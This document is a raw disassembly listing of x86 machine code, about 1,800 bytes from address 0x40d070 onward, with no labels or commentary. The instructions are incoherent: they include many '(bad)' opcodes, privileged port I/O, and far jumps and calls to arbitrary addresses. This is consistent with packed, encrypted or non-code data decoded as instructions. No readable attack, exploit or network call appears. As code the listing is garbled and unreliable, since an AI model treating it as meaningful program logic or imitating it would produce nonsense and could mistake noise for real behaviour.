  40d070:	push   esp
  40d071:	dec    esp
  40d072:	mov    bl,0xcb
  40d074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d075:	mov    dl,0xc4
  40d077:	pushf  
  40d078:	daa    
  40d079:	(bad)  
  40d07a:	dec    ebp
  40d07b:	cld    
  40d07c:	jge    0x40d025
  40d07e:	add    eax,0xf39ffa5d
  40d083:	aas    
  40d084:	mov    ch,0xee
  40d086:	leave  
  40d087:	push   0xffffff98
  40d089:	mov    bh,0x51
  40d08b:	icebp  
  40d08c:	loopne 0x40d037
  40d08e:	jno    0x40d075
  40d090:	fbld   TBYTE PTR [ecx]
  40d092:	cs stc 
  40d094:	inc    ecx
  40d095:	sahf   
  40d096:	sbb    al,0x8c
  40d098:	(bad)  
  40d099:	fldcw  WORD PTR [ecx]
  40d09b:	jmp    0xff2bc52a
  40d0a0:	or     al,0x5e
  40d0a2:	jmp    0x40d082
  40d0a4:	xchg   edi,eax
  40d0a5:	xchg   esi,eax
  40d0a6:	ja     0x40d06f
  40d0a8:	je     0x40d09a
  40d0aa:	cmp    al,0xf1
  40d0ac:	jle    0x40d073
  40d0ae:	mov    WORD PTR [edx+0x1458f63e],es
  40d0b4:	test   DWORD PTR [ecx],ebp
  40d0b6:	shr    DWORD PTR [ecx-0x34],cl
  40d0b9:	pop    edi
  40d0ba:	xchg   esp,eax
  40d0bb:	popf   
  40d0bc:	mov    ecx,0x6e472fd3
  40d0c1:	jmp    0xfc35:0x416dbb4c
  40d0c8:	dec    edi
  40d0c9:	(bad)  
  40d0ca:	push   ss
  40d0cb:	jl     0x40d052
  40d0cd:	ficom  WORD PTR [esi]
  40d0cf:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d2:	cwde   
  40d0d3:	ss cs jne 0x40d143
  40d0d7:	inc    ebx
  40d0d8:	sub    al,0x33
  40d0da:	xchg   ebp,eax
  40d0db:	push   ebx
  40d0dc:	dec    ecx
  40d0dd:	imul   ecx,DWORD PTR [ecx+0x54],0x38d8297e
  40d0e4:	sbb    DWORD PTR [esi-0x1e],edx
  40d0e7:	push   ebp
  40d0e8:	cmp    esi,DWORD PTR [esi]
  40d0ea:	dec    eax
  40d0eb:	(bad)  
  40d0ed:	xchg   BYTE PTR [ebx-0x41],cl
  40d0f0:	in     al,dx
  40d0f1:	dec    ebx
  40d0f2:	test   esp,edi
  40d0f4:	add    cl,BYTE PTR [eax-0x29]
  40d0f7:	push   esp
  40d0f8:	sar    eax,cl
  40d0fa:	pop    esp
  40d0fb:	mov    ebx,0xbd34796d
  40d100:	add    BYTE PTR [edx+0x5e7c44af],dh
  40d106:	add    eax,eax
  40d108:	lods   eax,DWORD PTR ds:[esi]
  40d109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d10a:	jge    0x40d134
  40d10c:	push   edi
  40d10d:	mov    ds:0xd1168607,eax
  40d112:	mov    ds:0xbb422841,eax
  40d117:	ror    DWORD PTR [ebx+0x9],1
  40d11a:	xchg   DWORD PTR [esi+eax*1+0x5c],edi
  40d11e:	aad    0xa9
  40d120:	in     al,0xf
  40d122:	or     BYTE PTR [edi-0x20],cl
  40d125:	xlat   BYTE PTR ds:[ebx]
  40d126:	test   dl,0x5a
  40d129:	fistp  DWORD PTR [eax]
  40d12b:	adc    eax,0xe7b1116a
  40d130:	daa    
  40d131:	inc    ebp
  40d132:	add    DWORD PTR [esi],ebp
  40d134:	xor    eax,0xb33da069
  40d139:	inc    ecx
  40d13a:	xlat   BYTE PTR ds:[ebx]
  40d13b:	ret    
  40d13c:	ins    BYTE PTR es:[edi],dx
  40d13d:	dec    ebx
  40d13e:	mov    ah,0xc
  40d140:	jae    0x40d1af
  40d142:	or     ah,BYTE PTR [ebp+0x6fca01ed]
  40d148:	xor    DWORD PTR [edi],edi
  40d14a:	les    ecx,FWORD PTR [esi]
  40d14c:	imul   ebx,DWORD PTR [ecx-0x4f],0x55
  40d150:	mov    ds:0x45525b56,eax
  40d155:	retf   
  40d156:	jl     0x40d0e1
  40d158:	in     al,dx
  40d159:	adc    edi,ebx
  40d15b:	outs   dx,BYTE PTR ds:[esi]
  40d15c:	adc    ah,BYTE PTR [esi-0x33a7d4a9]
  40d162:	pop    ds
  40d163:	push   esp
  40d164:	adc    ch,dl
  40d166:	add    al,0x18
  40d168:	mov    ecx,0xe1ef5e36
  40d16d:	ss push 0xcfbcfafd
  40d173:	test   esi,0x4fbb29f6
  40d179:	lods   al,BYTE PTR ds:[esi]
  40d17a:	test   al,0xdc
  40d17c:	xlat   BYTE PTR ds:[ebx]
  40d17d:	js     0x40d1aa
  40d17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d180:	inc    si
  40d182:	scas   eax,DWORD PTR es:[edi]
  40d183:	fdivr  DWORD PTR [edx+0x1092e4ce]
  40d189:	sbb    cl,al
  40d18b:	out    dx,eax
  40d18c:	mov    ecx,0x4a862f1e
  40d191:	xchg   esp,eax
  40d192:	and    al,0x1
  40d194:	call   0x62acb80c
  40d199:	imul   edx,DWORD PTR [eax],0xffffffa7
  40d19c:	mov    ebx,0xfe6336f
  40d1a1:	scas   eax,DWORD PTR es:[edi]
  40d1a2:	data16 mov bl,0x89
  40d1a5:	jo     0x40d15b
  40d1a7:	test   DWORD PTR [edi-0x4adf9e85],eax
  40d1ad:	dec    ebp
  40d1ae:	xlat   BYTE PTR ds:[ebx]
  40d1af:	out    dx,eax
  40d1b0:	inc    ebx
  40d1b1:	xchg   esi,eax
  40d1b2:	ds inc edx
  40d1b4:	pop    edi
  40d1b5:	sub    BYTE PTR [esi+0x1bcbe215],dh
  40d1bb:	add    BYTE PTR [edx+0x3aee25de],0x66
  40d1c2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d1c4:	pop    ss
  40d1c5:	jmp    0x77c4d4a0
  40d1ca:	cmp    eax,0xc4c90495
  40d1cf:	cli    
  40d1d0:	clc    
  40d1d1:	ja     0x40d1d8
  40d1d3:	dec    esi
  40d1d4:	daa    
  40d1d5:	rol    ecx,1
  40d1d7:	sbb    al,0x38
  40d1d9:	fwait
  40d1da:	int3   
  40d1db:	pop    ebp
  40d1dc:	cld    
  40d1dd:	push   ds
  40d1de:	mov    al,cs:0xb5598fcd
  40d1e4:	xlat   BYTE PTR ds:[ebx]
  40d1e5:	mov    edx,0xa9dd5618
  40d1ea:	imul   BYTE PTR [eax-0xdff08fd]
  40d1f0:	add    dh,BYTE PTR [esi]
  40d1f2:	rol    cl,1
  40d1f4:	push   ecx
  40d1f5:	inc    eax
  40d1f6:	test   eax,0xd2432608
  40d1fb:	add    BYTE PTR [eax-0x6f],cl
  40d1fe:	cmp    ebp,DWORD PTR [ecx-0x19]
  40d201:	mov    DWORD PTR [ebx+0x74a2d3f9],edx
  40d207:	fdiv   QWORD PTR [edx]
  40d209:	test   al,0x40
  40d20b:	test   DWORD PTR [eax-0x31],edx
  40d20e:	xor    ch,cl
  40d210:	mov    eax,0x64fae81e
  40d215:	push   ss
  40d216:	sahf   
  40d217:	test   BYTE PTR [esi-0x363d68ac],al
  40d21d:	jp     0x40d26d
  40d21f:	and    BYTE PTR [ecx-0x66],ch
  40d222:	fadd   QWORD PTR [eax-0x1]
  40d225:	aas    
  40d226:	xchg   ebx,eax
  40d227:	mov    ds:0x3f2ca6bc,eax
  40d22c:	jne    0x40d206
  40d22e:	in     al,0xc9
  40d230:	or     eax,0x63ec0583
  40d235:	xor    eax,0xeca2dcde
  40d23a:	mov    edx,0x23ad0935
  40d23f:	inc    esi
  40d240:	in     eax,dx
  40d241:	add    DWORD PTR [ebp-0x3712f2e4],ebx
  40d247:	xchg   esi,eax
  40d248:	dec    ecx
  40d249:	scas   eax,DWORD PTR es:[edi]
  40d24a:	in     eax,0xc5
  40d24c:	sbb    esi,esi
  40d24e:	ds sbb ah,0x7b
  40d252:	in     eax,0x57
  40d254:	and    ch,al
  40d256:	cmp    ebp,DWORD PTR [esi+0x58]
  40d259:	push   0x74
  40d25b:	addps  xmm0,xmm5
  40d25e:	sbb    al,0xb
  40d260:	or     dl,al
  40d262:	sbb    edx,esp
  40d264:	cmp    al,0xab
  40d266:	sub    ah,BYTE PTR [ebp+0x24]
  40d269:	push   0xffffff98
  40d26b:	xor    eax,0xf71d6703
  40d270:	push   edi
  40d271:	aad    0x63
  40d273:	nop
  40d274:	pop    esi
  40d275:	push   ds
  40d276:	ins    BYTE PTR es:[edi],dx
  40d277:	dec    esp
  40d278:	iret   
  40d279:	div    DWORD PTR [ebp+0x3a21495f]
  40d27f:	jmp    0x4583cee4
  40d284:	scas   eax,DWORD PTR es:[edi]
  40d285:	pop    ebp
  40d286:	jle    0x40d303
  40d288:	out    0x4b,al
  40d28a:	out    0x1d,eax
  40d28c:	sub    DWORD PTR [esi+0x3d0ffdfc],ebx
  40d292:	jmp    0xca99:0x6ae1ae1f
  40d299:	inc    edx
  40d29a:	push   ecx
  40d29b:	imul   edx,esi,0xffffffaf
  40d29e:	push   0x5d3d72cd
  40d2a3:	popa   
  40d2a4:	fisubr DWORD PTR [ebx]
  40d2a6:	out    dx,eax
  40d2a7:	cdq    
  40d2a8:	(bad)
  40d2ac:	jnp    0x40d2c1
  40d2ae:	jb     0x40d2ce
  40d2b0:	scas   eax,DWORD PTR es:[edi]
  40d2b1:	xor    al,0x79
  40d2b3:	ja     0x40d24e
  40d2b5:	std    
  40d2b6:	push   edx
  40d2b7:	xor    al,0xc7
  40d2b9:	(bad)
  40d2bc:	imul   ecx,DWORD PTR [ecx],0x1f7247d5
  40d2c2:	jne    0x40d260
  40d2c4:	mov    cl,0xb7
  40d2c6:	call   0xbc0e:0x4cdc0c08
  40d2cd:	push   ebx
  40d2ce:	pop    ecx
  40d2cf:	sbb    ch,ch
  40d2d1:	(bad)  
  40d2d3:	pop    edx
  40d2d4:	xchg   esi,eax
  40d2d5:	ror    edx,0xf3
  40d2d8:	adc    bh,al
  40d2da:	dec    edx
  40d2db:	hlt    
  40d2dc:	xor    eax,0xa642528e
  40d2e1:	mov    edi,gs
  40d2e3:	lock adc eax,0xf1b1b059
  40d2e9:	out    dx,al
  40d2ea:	push   ecx
  40d2eb:	(bad)  
  40d2ec:	inc    DWORD PTR [ebx+0x642a93ed]
  40d2f2:	jnp    0x40d284
  40d2f4:	icebp  
  40d2f5:	imul   esi,DWORD PTR fs:[edi],0xf5715438
  40d2fc:	xor    al,0xd0
  40d2fe:	hlt    
  40d2ff:	je     0x40d2b1
  40d301:	jae    0x40d2ff
  40d303:	test   DWORD PTR [eax],ebp
  40d305:	lea    eax,[ebp+0x4e5729b0]
  40d30b:	sbb    eax,0x67e61cfd
  40d310:	xchg   esi,eax
  40d311:	mov    al,0xc8
  40d313:	mov    ds:0xbcd36026,eax
  40d318:	push   ebx
  40d319:	sbb    eax,0x34f2cf15
  40d31e:	fs sub ebx,ebp
  40d321:	fs in  eax,dx
  40d323:	xchg   BYTE PTR [ebp+0x17ccb156],dl
  40d329:	retf   
  40d32a:	sub    al,0x3e
  40d32c:	sbb    al,0x96
  40d32e:	test   al,0xe
  40d330:	xchg   edx,eax
  40d331:	sub    edx,DWORD PTR [ebp+0x3166b987]
  40d337:	fisttp WORD PTR [ebx+ebp*4+0x20]
  40d33b:	popa   
  40d33c:	push   0x7a
  40d33e:	out    dx,al
  40d33f:	xor    dl,cl
  40d341:	mov    al,ds:0x3d8aa1a3
  40d346:	pop    edi
  40d347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d348:	in     eax,dx
  40d349:	jbe    0x40d2e1
  40d34b:	inc    esp
  40d34c:	ret    0xcfcd
  40d34f:	repnz pop edi
  40d351:	scas   eax,DWORD PTR es:[edi]
  40d352:	(bad)  
  40d353:	xchg   ecx,eax
  40d354:	cld    
  40d355:	fcmovnb st,st(3)
  40d357:	loop   0x40d320
  40d359:	sbb    DWORD PTR [ecx+eax*1+0x256c12d1],esp
  40d360:	mov    bl,0xd0
  40d362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d363:	test   al,0xe5
  40d365:	fistp  DWORD PTR [eax-0x38]
  40d368:	lock ss enter 0x4eac,0xff
  40d36e:	inc    esp
  40d36f:	fdiv   QWORD PTR [ecx+eiz*1]
  40d372:	lahf   
  40d373:	loopne 0x40d353
  40d375:	sbb    DWORD PTR [ecx+0x37],0x2
  40d379:	push   ds
  40d37a:	adc    cl,BYTE PTR [edx]
  40d37c:	ins    DWORD PTR es:[edi],dx
  40d37d:	push   ebx
  40d37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d37f:	das    
  40d380:	pop    ebp
  40d381:	jecxz  0x40d3be
  40d383:	push   esp
  40d384:	mov    WORD PTR [ebx+ebp*2],fs
  40d387:	ss pop ss
  40d389:	mov    ds:0xd4d430c7,eax
  40d38e:	in     eax,0xb5
  40d390:	push   0x730015d6
  40d395:	call   0xee70:0xae4439a4
  40d39c:	push   0x36c0011
  40d3a1:	lds    ebx,FWORD PTR [ebp-0x41b88b68]
  40d3a7:	mov    DWORD PTR [esi-0xe4449dd],edi
  40d3ad:	add    eax,0x446406aa
  40d3b2:	xchg   ebp,eax
  40d3b3:	iret   
  40d3b4:	sbb    BYTE PTR [edx-0x26],bh
  40d3b7:	inc    edx
  40d3b8:	or     al,0xf1
  40d3ba:	adc    BYTE PTR [edi-0x4944daa],cl
  40d3c0:	push   eax
  40d3c1:	sub    al,0x60
  40d3c3:	dec    edi
  40d3c4:	dec    edx
  40d3c5:	and    bh,ch
  40d3c7:	in     eax,dx
  40d3c8:	inc    edi
  40d3c9:	std    
  40d3ca:	aas    
  40d3cb:	pop    eax
  40d3cc:	ins    DWORD PTR es:[edi],dx
  40d3cd:	pop    ebp
  40d3ce:	bnd jb 0x40d3ff
  40d3d1:	push   esi
  40d3d2:	jl     0x40d37b
  40d3d4:	stc    
  40d3d5:	push   esp
  40d3d6:	push   eax
  40d3d7:	and    BYTE PTR [ebp+0x771586d6],cl
  40d3dd:	ret    
  40d3de:	mov    ebx,0x3c86d931
  40d3e3:	iret   
  40d3e4:	xlat   BYTE PTR ds:[ebx]
  40d3e5:	xchg   esi,eax
  40d3e6:	call   0xbac79084
  40d3eb:	xchg   edx,eax
  40d3ec:	(bad)  
  40d3ed:	test   al,0xde
  40d3ef:	pop    edi
  40d3f0:	ins    DWORD PTR es:[edi],dx
  40d3f1:	(bad)  
  40d3f2:	fistp  WORD PTR [esi]
  40d3f4:	rol    BYTE PTR [esi],1
  40d3f6:	adc    esp,DWORD PTR [edx]
  40d3f8:	jl     0x40d3c9
  40d3fa:	xchg   edi,eax
  40d3fb:	adc    al,0xda
  40d3fd:	lds    eax,FWORD PTR [ebp+0x10]
  40d400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d401:	sbb    ebx,ecx
  40d403:	or     edi,0x37d9387e
  40d409:	bound  ebx,QWORD PTR [ecx]
  40d40b:	dec    ebx
  40d40c:	and    BYTE PTR [edx+0x60],0xc9
  40d410:	jmp    0x215eda35
  40d415:	out    0x9e,al
  40d417:	hlt    
  40d418:	aad    0x89
  40d41a:	out    dx,al
  40d41b:	ds retf 0x4674
  40d41f:	pop    DWORD PTR [edx+0x23]
  40d422:	dec    eax
  40d423:	clc    
  40d424:	fsub   DWORD PTR [eax-0x3e1ffa39]
  40d42a:	push   esp
  40d42b:	xchg   edi,eax
  40d42c:	cmp    DWORD PTR [ebx-0x3caceb77],ebx
  40d432:	or     eax,DWORD PTR [ecx+eax*1]
  40d435:	ds and eax,0xb2ff8635
  40d43b:	fwait
  40d43c:	mov    dl,BYTE PTR [eax-0x3e744227]
  40d442:	mov    dh,0x55
  40d444:	das    
  40d445:	pop    esp
  40d446:	sti    
  40d447:	push   edi
  40d448:	outs   dx,DWORD PTR ds:[esi]
  40d449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d44a:	lock pop esi
  40d44c:	or     al,0xa8
  40d44e:	dec    ebx
  40d44f:	ror    DWORD PTR ds:0x77f496b1,cl
  40d455:	jmp    0x4fed4b8d
  40d45a:	xor    BYTE PTR [esp+eiz*4-0x57cda324],dl
  40d461:	pushf  
  40d462:	jno    0x40d4b2
  40d464:	loopne 0x40d435
  40d466:	xlat   BYTE PTR ds:[ebx]
  40d467:	outs   dx,BYTE PTR ds:[esi]
  40d468:	sbb    ebx,DWORD PTR [edx+0x19]
  40d46b:	dec    ebp
  40d46c:	test   al,0x1e
  40d46e:	cs ret 
  40d470:	(bad)  
  40d471:	mov    edi,0x52917158
  40d476:	ret    
  40d477:	dec    esi
  40d478:	push   es
  40d479:	xchg   ebp,eax
  40d47a:	mov    dh,0xab
  40d47c:	jb     0x40d4e7
  40d47e:	add    al,0xb2
  40d480:	push   edx
  40d481:	cli    
  40d482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d483:	sub    eax,0x2726a69b
  40d488:	mov    ebp,0x38ff1160
  40d48d:	fcomp  DWORD PTR [ebp-0x7f]
  40d490:	mov    esi,0x3d175d62
  40d495:	or     al,0x6b
  40d497:	stos   DWORD PTR es:[edi],eax
  40d498:	jge    0x40d437
  40d49a:	mov    ebp,0x758b0ba0
  40d49f:	inc    esp
  40d4a0:	leave  
  40d4a1:	pop    ecx
  40d4a2:	xor    al,0xbb
  40d4a4:	jb     0x40d453
  40d4a6:	push   edx
  40d4a7:	ret    0xaedb
  40d4aa:	and    al,0x1f
  40d4ac:	xchg   edx,eax
  40d4ad:	mov    eax,0xd48a50e4
  40d4b2:	cs (bad) 
  40d4b4:	push   esp
  40d4b5:	pop    ds
  40d4b6:	out    dx,al
  40d4b7:	mov    cl,dh
  40d4b9:	ds gs cmp ax,0x2d3b
  40d4bf:	xor    DWORD PTR [eax-0x2a],ebp
  40d4c2:	loopne 0x40d4a2
  40d4c4:	cmp    BYTE PTR [ecx-0x4ef0c47d],cl
  40d4ca:	adc    BYTE PTR [ebx+0x41],bl
  40d4cd:	jp     0x40d479
  40d4cf:	dec    ebp
  40d4d0:	dec    ebp
  40d4d1:	jp     0x40d4b3
  40d4d3:	cli    
  40d4d4:	(bad)  
  40d4d5:	aaa    
  40d4d6:	arpl   WORD PTR [ecx+ecx*4+0x3085931e],si
  40d4dd:	cmp    BYTE PTR [eax],0x30
  40d4e0:	and    BYTE PTR [eax+esi*1],dh
  40d4e3:	and    eax,0xde7a5f0
  40d4e8:	mov    ecx,0xe264a7ed
  40d4ed:	mov    ah,0x32
  40d4ef:	xlat   BYTE PTR ds:[ebx]
  40d4f0:	je     0x40d50a
  40d4f2:	cmp    DWORD PTR [esi-0x1641c7a2],esi
  40d4f8:	sti    
  40d4f9:	rcr    BYTE PTR [edi-0x55],0xd0
  40d4fd:	retf   
  40d4fe:	daa    
  40d4ff:	(bad)  
  40d501:	cmp    ebp,eax
  40d503:	adc    BYTE PTR [esi-0x2aa1c5a7],0x2f
  40d50a:	pop    edi
  40d50b:	(bad)  [esi+eiz*2]
  40d50e:	(bad)  
  40d50f:	in     eax,dx
  40d510:	lahf   
  40d511:	mov    ah,0xc
  40d513:	lahf   
  40d514:	rol    BYTE PTR [ebx-0x7feafe17],0x64
  40d51b:	xchg   edx,eax
  40d51c:	enter  0x83da,0x49
  40d520:	adc    BYTE PTR [esp+edi*2+0x36],ch
  40d524:	test   DWORD PTR [ebx-0x1030676b],edi
  40d52a:	add    eax,DWORD PTR [esi]
  40d52c:	outs   dx,DWORD PTR ds:[esi]
  40d52d:	dec    ebp
  40d52e:	xor    al,0xfb
  40d530:	sbb    al,0x69
  40d532:	ret    0xb5cb
  40d535:	test   eax,0x3adeffa2
  40d53a:	add    esp,ebx
  40d53c:	inc    ebx
  40d53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d53e:	shr    BYTE PTR [edx],0xf1
  40d541:	mov    ah,0x69
  40d543:	dec    ebp
  40d544:	shl    DWORD PTR [eax+0x53],cl
  40d547:	and    cl,bh
  40d549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d54a:	push   ecx
  40d54b:	or     esi,DWORD PTR [eax+ecx*2]
  40d54e:	jbe    0x40d536
  40d550:	jl     0x40d4e6
  40d552:	mov    ss,WORD PTR [eax+eax*1]
  40d555:	or     dh,BYTE PTR [ebx-0x25]
  40d558:	ja     0x40d563
  40d55a:	out    dx,al
  40d55b:	sub    DWORD PTR [ecx-0x78],0x80f725b6
  40d562:	xor    DWORD PTR [esi],ebx
  40d564:	and    al,0x1b
  40d566:	pop    esp
  40d567:	dec    esi
  40d568:	call   0xe95e:0x30b3159f
  40d56f:	jmp    0x9900de1
  40d574:	cmp    al,0x24
  40d576:	enter  0x4385,0x55
  40d57a:	ins    BYTE PTR es:[edi],dx
  40d57b:	(bad)
  40d57f:	aaa    
  40d580:	std    
  40d581:	pop    es
  40d582:	mov    ebp,0xcff06b76
  40d587:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40d589:	dec    eax
  40d58a:	ins    DWORD PTR es:[edi],dx
  40d58b:	dec    eax
  40d58c:	pushf  
  40d58d:	sub    dl,ch
  40d58f:	mov    fs,eax
  40d591:	push   ebx
  40d592:	mov    ah,0x1d
  40d594:	rcr    BYTE PTR [esi+0xd],0x73
  40d598:	(bad)  
  40d599:	push   ebx
  40d59a:	jge    0x40d5a3
  40d59c:	scas   eax,DWORD PTR es:[edi]
  40d59d:	and    DWORD PTR [eax+0x0],esp
  40d5a0:	cdq    
  40d5a1:	mov    ah,0xd7
  40d5a3:	push   ds
  40d5a4:	sbb    eax,0x3924b87
  40d5a9:	mov    ecx,0x38de1d12
  40d5ae:	shr    ah,0xf0
  40d5b1:	ja     0x40d577
  40d5b3:	dec    eax
  40d5b4:	retf   0xe17c
  40d5b7:	nop
  40d5b8:	mov    edi,0x2ae30780
  40d5bd:	rcl    DWORD PTR [edx],cl
  40d5bf:	clc    
  40d5c0:	imul   ebp,DWORD PTR [edi],0x1d
  40d5c3:	ror    eax,1
  40d5c5:	and    DWORD PTR [ebx-0x74],ecx
  40d5c8:	pop    ebx
  40d5c9:	push   ds
  40d5ca:	sahf   
  40d5cb:	inc    eax
  40d5cc:	jmp    0xeca59656
  40d5d1:	mov    bh,ch
  40d5d3:	mov    ecx,ds
  40d5d5:	inc    edx
  40d5d6:	xchg   ecx,eax
  40d5d7:	cmp    eax,0x80b0ff00
  40d5dc:	sbb    al,dl
  40d5de:	mov    edi,0xfaa3f7ea
  40d5e3:	or     DWORD PTR [eax-0x23405a5c],ecx
  40d5e9:	adc    dh,bl
  40d5eb:	pop    eax
  40d5ec:	out    0xba,al
  40d5ee:	shl    esi,1
  40d5f0:	jo     0x40d5ce
  40d5f2:	fdiv   QWORD PTR [ebp+0x284a19e7]
  40d5f8:	push   ebp
  40d5f9:	push   ss
  40d5fa:	in     al,0x87
  40d5fc:	dec    edi
  40d5fd:	das    
  40d5fe:	and    edx,DWORD PTR [ecx-0x42]
  40d601:	jl     0x40d5fb
  40d603:	or     eax,0x6c0be296
  40d608:	les    ebx,FWORD PTR [eax]
  40d60a:	(bad)  
  40d60b:	push   esi
  40d60c:	sbb    bh,BYTE PTR [esi-0x6b]
  40d60f:	test   al,0x93
  40d611:	stos   BYTE PTR es:[edi],al
  40d612:	xchg   esi,eax
  40d613:	or     al,bl
  40d615:	jp     0x40d65b
  40d617:	jnp    0x40d639
  40d619:	aas    
  40d61a:	rol    DWORD PTR [edi-0x1d11d9cf],cl
  40d620:	inc    eax
  40d621:	push   ds
  40d622:	sub    cl,ah
  40d624:	pop    ecx
  40d625:	cmp    esp,ebx
  40d627:	aas    
  40d628:	pop    ebx
  40d629:	xchg   ecx,eax
  40d62a:	test   al,0x2f
  40d62c:	ins    DWORD PTR es:[edi],dx
  40d62d:	sti    
  40d62e:	cmp    esp,DWORD PTR [eax]
  40d630:	mov    ss,WORD PTR [edi-0x4efa6fd]
  40d636:	mov    dh,0x66
  40d638:	push   ss
  40d639:	sbb    ch,dh
  40d63b:	scas   al,BYTE PTR es:[edi]
  40d63c:	sub    ebx,DWORD PTR [eax+0x16ad3154]
  40d642:	dec    ebp
  40d643:	js     0x40d60e
  40d645:	scas   eax,DWORD PTR es:[edi]
  40d646:	pusha  
  40d647:	je     0x40d622
  40d649:	mov    dh,0x8a
  40d64b:	call   0x31ec:0x70d635df
  40d652:	jbe    0xe794aa2f
  40d658:	cmp    dl,BYTE PTR [ecx+eiz*4]
  40d65b:	cmp    al,0x4e
  40d65d:	(bad)  
  40d65f:	test   DWORD PTR [esi-0x19],edi
  40d662:	in     al,0x67
  40d664:	or     al,0x3e
  40d666:	outs   dx,DWORD PTR fs:[esi]
  40d668:	xlat   BYTE PTR ds:[bx]
  40d66a:	inc    ebx
  40d66b:	xor    bh,BYTE PTR [ebx]
  40d66d:	lahf   
  40d66e:	pop    esi
  40d66f:	jno    0x40d665
  40d671:	push   esp
  40d672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d673:	and    al,BYTE PTR [esi-0x53]
  40d676:	loope  0x40d6cf
  40d678:	hlt    
  40d679:	mov    ah,0x67
  40d67b:	cmp    al,0xdf
  40d67d:	push   ebp
  40d67e:	clc    
  40d67f:	mov    dh,0xdc
  40d681:	sub    al,0xbf
  40d683:	xor    dh,BYTE PTR [eax+edx*4-0x39]
  40d687:	add    edi,DWORD PTR [esi-0x48]
  40d68a:	cli    
  40d68b:	pop    ss
  40d68c:	inc    edi
  40d68d:	sbb    bl,cl
  40d68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d690:	les    eax,FWORD PTR [edx-0x630bf659]
  40d696:	bound  esi,QWORD PTR [edi-0x50]
  40d699:	mov    al,0xe0
  40d69b:	stc    
  40d69c:	cmp    ecx,esi
  40d69e:	nop
  40d69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a0:	mov    ch,cl
  40d6a2:	push   ecx
  40d6a3:	sub    esp,DWORD PTR [edi]
  40d6a5:	aad    0x3f
  40d6a7:	(bad)  
  40d6a8:	pop    ebp
  40d6a9:	jns    0x40d652
  40d6ab:	frstor ds:0x85d1ab1b
  40d6b1:	cli    
  40d6b2:	rol    BYTE PTR [ebx],cl
  40d6b4:	stos   DWORD PTR es:[edi],eax
  40d6b5:	fist   WORD PTR [ebp+0x30d20316]
  40d6bb:	dec    ebx
  40d6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6bd:	inc    esp
  40d6be:	xor    eax,0x2d7eb438
  40d6c3:	jb     0x40d725
  40d6c5:	xlat   BYTE PTR ds:[ebx]
  40d6c6:	ficomp DWORD PTR [esi-0x6d]
  40d6c9:	out    0xa,eax
  40d6cb:	add    bh,bh
  40d6cd:	nop
  40d6ce:	stos   DWORD PTR es:[edi],eax
  40d6cf:	push   ss
  40d6d0:	dec    esi
  40d6d1:	test   al,ch
  40d6d3:	xchg   BYTE PTR ds:0x63ac1340,dl
  40d6d9:	add    DWORD PTR [ecx],edi
  40d6db:	ins    BYTE PTR es:[edi],dx
  40d6dc:	sbb    esp,ebp
  40d6de:	mov    edx,eax
  40d6e0:	cmp    bl,BYTE PTR [eax-0x2d76b6fc]
  40d6e6:	dec    edi
  40d6e7:	das    
  40d6e8:	jecxz  0x40d769
  40d6ea:	add    eax,0x92ac190a
  40d6ef:	pop    ds
  40d6f0:	scas   al,BYTE PTR es:[edi]
  40d6f1:	sbb    esp,DWORD PTR [esi-0x25]
  40d6f4:	fisubr DWORD PTR [esi-0x778d2926]
  40d6fa:	mov    dh,0x40
  40d6fc:	leave  
  40d6fd:	fnstsw WORD PTR [ebp+0x64]
  40d700:	out    0xec,al
  40d702:	or     edx,eax
  40d704:	test   DWORD PTR [esi-0xd519715],0x7f2304d0
  40d70e:	std    
  40d70f:	stc    
  40d710:	mov    BYTE PTR ds:0xea4848f7,bl
  40d716:	cmp    eax,0xd6e51f37
  40d71b:	or     al,0xbb
  40d71d:	adc    al,BYTE PTR [eax+0x5a]
  40d720:	or     al,0x90
  40d722:	std    
  40d723:	mov    al,ds:0x975ae6be
  40d728:	or     edx,DWORD PTR [edi]
  40d72a:	mov    al,ds:0x7bf2e8b7
  40d72f:	(bad)  
  40d730:	cmc    
  40d731:	pop    edi
  40d732:	hlt    
  40d733:	mov    dl,0x4b
  40d735:	jne    0x40d6cf
  40d737:	mov    al,0x88
  40d739:	xlat   BYTE PTR ds:[ebx]
  40d73a:	jecxz  0x40d79f
  40d73c:	in     eax,0x44
  40d73e:	fild   DWORD PTR [ebx]
  40d740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d741:	lock and al,al
  40d744:	out    0x31,al
  40d746:	and    esp,DWORD PTR [esi+0x7]
  40d749:	sar    BYTE PTR [eax],0xc6
  40d74c:	pop    edx
  40d74d:	fisub  WORD PTR [edx+edx*8+0x7721c8b5]
  40d754:	stos   BYTE PTR es:[edi],al
  40d755:	pop    ecx
  40d756:	fild   WORD PTR [ebp+edx*1-0x59fc4781]
  40d75d:	fadd   QWORD PTR [edx+0x5e506e62]
  40d763:	out    dx,al
  40d764:	fwait
  40d765:	aas    
  40d766:	add    eax,DWORD PTR [edx+0x15]
  40d769:	jmp    0x3b257ddc
  40d76e:	pusha  
  40d76f:	and    ebp,edi
  40d771:	sub    DWORD PTR [ebx-0x36c24c22],esp
  40d777:	in     eax,0x82
  40d779:	jecxz  0x40d7ef
  40d77b:	dec    ebx
  40d77c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d77d:	pop    ss
  40d77e:	xchg   edx,eax
  40d77f:	(bad)  
